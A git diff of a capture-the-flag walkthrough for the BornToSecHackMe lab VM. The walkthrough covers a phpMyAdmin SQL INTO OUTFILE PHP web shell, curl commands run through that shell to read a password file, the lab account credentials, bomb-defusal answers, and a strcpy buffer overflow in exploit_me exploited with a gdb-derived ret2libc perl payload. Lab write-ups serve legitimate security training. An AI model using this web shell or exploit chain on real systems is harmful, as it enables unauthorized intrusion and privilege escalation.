@@ -1,15 +1,20 @@
 ## phpmyadmin
+
 Login with `root/Fg-'kKXBj87E:aJ$`
+
 ```
 SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
+```
+We injected our shell into a file `shell.php` under directory `/var/www/forum/templates_c` which we have write permission.
 
-> curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=whoami'
+```
+$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=whoami'
 www-data
-> curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=find+/home+-user+www-data'
+$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=find+/home+-user+www-data'
 /home
 /home/LOOKATME
 /home/LOOKATME/password
-> curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password'
+$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password'
 lmezard:G!@M6f4Eatau{sF"
 ```
 
@@ -17,7 +22,7 @@ lmezard:G!@M6f4Eatau{sF"
 Login with `lmezard:G!@M6f4Eatau{sF"`
 
 ```
-> ftp lmezard@$VMIP
+$ ftp lmezard@$VMIP
 Connected to 192.168.57.2.
 220 Welcome on this server
 331 Please specify the password.
@@ -30,23 +35,23 @@ ftp> ls
 -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
 226 Directory send OK.
 
-> cat README
+$ cat README
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
 
 ```
-> file fun
+$ file fun
 fun: POSIX tar archive (GNU)
-> tar -xf fun
+$ tar -xf fun
 ```
 
 ```
-> printf 'Iheartpwnage' | shasum -a 256
+$ printf 'Iheartpwnage' | shasum -a 256
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
 ```
 
 ## ssh laurie
-Login in with `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.
+Login with `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.
 ```
 laurie@BornToSecHackMe:~$ cat README
 Diffuse this bomb!
@@ -63,35 +68,46 @@ o
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
 
+```
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+1 2 6 24 120 720
+That's number 2.  Keep going!
+1 b 214
+Halfway there!
+9
+So you got that one.  Try this one.
+opekmq
+Good work!  On to the next...
+4 2 6 3 1 5
+Congratulations! You've defused the bomb!
+```
+Now we have the password for thor `Publicspeakingisveryeasy.126241207201b2149opekmq426315`. According to a Slack thread, these is an error in the ISO file, the real password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.
+
 ## ssh thor
+Login with `thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+```
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+```
+
+The filename itself is a hint. We need to play with a Python lib called [turtle](https://docs.python.org/3/library/turtle.html).
 
 ## ssh zaz
+
+Login with `zaz:646da671ca01bb5d84dbb5fb2238dc8e`.
+
 ```
 zaz@BornToSecHackMe:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" exploit_me
-Dump of assembler code for function main:
-   0x080483f4 <+0>:	push   ebp
-   0x080483f5 <+1>:	mov    ebp,esp
-   0x080483f7 <+3>:	and    esp,0xfffffff0
-   0x080483fa <+6>:	sub    esp,0x90
-   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
-   0x08048404 <+16>:	jg     0x804840d <main+25>
-   0x08048406 <+18>:	mov    eax,0x1
-   0x0804840b <+23>:	jmp    0x8048436 <main+66>
-   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x08048410 <+28>:	add    eax,0x4
-   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
-   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
-   0x08048419 <+37>:	lea    eax,[esp+0x10]
    0x0804841d <+41>:	mov    DWORD PTR [esp],eax
-   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+=> 0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
    0x08048425 <+49>:	lea    eax,[esp+0x10]
-   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
-   0x0804842c <+56>:	call   0x8048310 <puts@plt>
-   0x08048431 <+61>:	mov    eax,0x0
-   0x08048436 <+66>:	leave
-   0x08048437 <+67>:	ret
-End of assembler dump.
 ```
+`exploit_me` calls `strcpy` function to copy our input `argv[1]` directly into a buffer without checking its size. We can simply overwrite `eip`.
+
 
 ```
 zaz@BornToSecHackMe:~$ gdb -q exploit_me
@@ -114,6 +130,17 @@ Stack level 0, frame at 0xbffff760:
 (gdb) print 0xbffff75c - 0xbffff6d0
 $1 = 140
 ```
+We got offset 140 by calculate `eip - eax`.
+
+```
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+```
+We found all the information to do a `ret2libc` attack.
 
 ```
 zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
